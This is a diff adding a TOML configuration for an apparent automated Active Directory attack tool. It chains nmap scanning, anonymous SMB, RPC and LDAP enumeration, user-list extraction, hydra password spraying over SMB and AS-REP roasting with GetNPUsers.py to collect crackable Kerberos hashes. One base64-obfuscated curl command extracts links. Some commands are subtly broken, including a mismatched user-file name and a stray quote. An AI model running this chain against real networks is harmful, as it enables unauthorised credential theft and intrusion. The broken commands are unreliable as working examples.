@@ -1,0 +1,110 @@
+[nmap]
+name = "nmap"
+cmd = "nmap -v -Pn {ip}"
+
+  [[nmap.patterns]]
+  "Discovered open port (445|139)" = [
+    "SMB_SERVICE_FOUND",
+    "RPC_SERVICE_FOUND"
+  ]
+
+  [[nmap.patterns]]
+  "Discovered open port (389)" = [
+    "LDAP_SERVICE_FOUND"
+  ]
+
+[smbclient-anonymous]
+name = "smbclient-anonymous"
+cmd = "smbclient -U ''%'' \\\\\\\\{ip}\\\\IPC$ -c 'AZERTY;q'"
+
+  [[smbclient-anonymous.patterns]]
+  "AZERTY: command not found" = [
+    "SMB_ACCESS"
+  ]
+
+[ldap-base]
+name = "ldap-base"
+cmd = "ldapsearch -LLL -x -h {ip} -s base"
+
+  [[ldap-base.store]]
+  domain_name = "ldapServiceName: .*\\@(.*)$"
+
+  [[ldap-base.store]]
+  dc_dns = "dnsHostName: (.*?)$"
+
+  [[ldap-base.store]]
+  domain_dn = "rootDomainNamingContext: (.*?)$"
+
+  [[ldap-base.patterns]]
+  "rootDomainNamingContext: DC=.*$" = [
+    "LDAP_DOMAIN_CONTROLLER"
+  ]
+
+[ldap-anonymous-dc]
+name = "ldap-anonymous-dc"
+cmd = "ldapsearch -LLL -x -h {ip} -b '{domain_dn}' > {output_dir}ldap-anonymous-dc.txt"
+
+  [[ldap-anonymous-dc.store_static]]
+  ldap_dc_output_file = "{output_dir}ldap-anonymous-dc.txt"
+
+[rpc-anonymous]
+name = "rpc-anonymous"
+cmd = "rpcclient -U ''%'' {ip} -c 'AZERTY;quit' 2>/dev/null'"
+
+  [[rpc-anonymous.patterns]]
+  "command not found: AZERTY" = [
+    "RPC_ACCESS"
+  ]
+
+[rpc-list-users]
+name = "rpc-list-users"
+cmd = "rpcclient -U ''%'' {ip} -c 'enumdomusers;quit' 2>/dev/null | cut -d[ -f2 | cut -d] -f1 > {output_dir}rpc-users.lst; [ -s {output_dir}rpc-users.lst ] && grep -vq 'result was' {output_dir}rpc_users.lst && echo 'USERS FOUND'"
+
+  [[rpc-list-users.store_static]]
+  users_file = "{output_dir}rpc-users.lst"
+
+  [[rpc-list-users.patterns]]
+  "USERS FOUND" = [
+    "RPC_USER_LIST"
+  ]
+
+[hydra-nsr-spraying]
+name = "hydra-nsr-spraying"
+cmd = "hydra -L {users_file} -e nsr smb://{ip}"
+
+[asreproast]
+name = "asreproast"
+cmd = "GetNPUsers.py {domain_name}/ -usersfile {users_file} -no-pass -dc-ip {ip} -outputfile {output_dir}asreproast.hash; [ -s {output_dir}asreproast.hash ] && echo 'TGT FOUND'"
+
+  [[asreproast.store_static]]
+  asreproast_hashes = "{output_dir}asreproast.hash"
+
+  [[asreproast.patterns]]
+  "TGT FOUND" = [
+    "USER_TGT_FOUND"
+  ]
+
+[extract-links-html]
+name = "extract-links-html"
+cmd = "Y3VybCAtcyAtTCAtayB7dXJsfSB8IGdyZXAgLUV3aG8gIihzcmN8aHJlZilbJ1wiXT9ccypbPTpdXHMqWydcIl0/W14nXCJdW14nXCI+IF0qIiB8IGF3ayAne3tzcGxpdCgkMCxhcnIsLyhocmVmfHNyYylbPTpdW1wiJyddPy8pOyBwcmludCBhcnJbMl19fScgfCBzb3J0IC1mdSB8IGF3ayAne3tpZiAoJDB+L2h0dHAvKSB7e3ByaW50ICQwfX0gZWxzZSB7e3ByaW50ICJ7dXJsfS8iJDB9fX19JyB8IGdyZXAgLUV2ICJcLihwbmd8c3ZnfGpwZ3xqcGVnfGNzcykiIHwgc29ydCAtZnUgPiB7b3V0cHV0X2Rpcn11cmxzLmxzdDsgWyAtcyB7b3V0cHV0X2Rpcn11cmxzLmxzdCBdICYmIGVjaG8gIlVSTFMgRk9VTkQi"
+base64 = true
+
+  [[extract-links-html.store_static]]
+  urls_file = "{output_dir}urls.lst"
+
+  [[extract-links-html.patterns]]
+  "URLS FOUND" = [
+    "RECON_JS_FILES"
+  ]
+
+[recon-js-files]
+name = "recon-js-files"
+cmd = "python3 ~/programs/reconjs/reconjs.py -d {output_dir}reconjs -f {urls_file} -o reconjs.lst"
+
+  [[recon-js-files.patterns]]
+  "map file found !" = [
+    "JS_MAP_FILE_FOUND"
+  ]
+  "Unminified file found !" = [
+    "JS_UNMINIFIED_FILE_FOUND"
+  ]
